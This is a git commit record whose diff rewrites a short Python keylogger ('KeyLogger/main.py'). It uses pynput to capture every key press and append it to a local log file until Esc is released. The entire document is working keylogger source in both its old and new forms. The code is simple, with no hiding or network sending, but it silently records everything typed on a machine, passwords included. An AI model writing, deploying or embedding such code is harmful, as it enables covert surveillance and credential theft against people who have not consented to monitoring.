36cab9463f110424f1eac512ca9d85c99647239d
Shivani Bisht <96690020+Shiv13jm@users.noreply.github.com>
2023-07-18 21:50:59 +0530

    Update main.py

--- KeyLogger/main.py
+++ KeyLogger/main.py
@@ -1,27 +1,22 @@
-from pynput.keyboard import Key, Listener    
-k=[]
+import pynput
+from pynput.keyboard import Key, Listener
+
+keys = []
 
 def on_press(key):
-    k.append(key)
-    write_1(k)
-    print(key)
-    
+    global keys
+    keys.append(key)
+    write_file(keys)
+    keys = []
 
-def write_1(var):
-    with open("demo.txt","a") as f:
-        for i in var:
-            new_var= str(i).replace("'",'')
-            f.write(new_var) 
-            f.write(" ")
-         
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            f.write(str(key) + '\t')
 
 def on_release(key):
     if key == Key.esc:
         return False
 
-with Listener (on_press=on_press, on_release=on_release) as l:
-    l.join()
-
-
-
- 
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
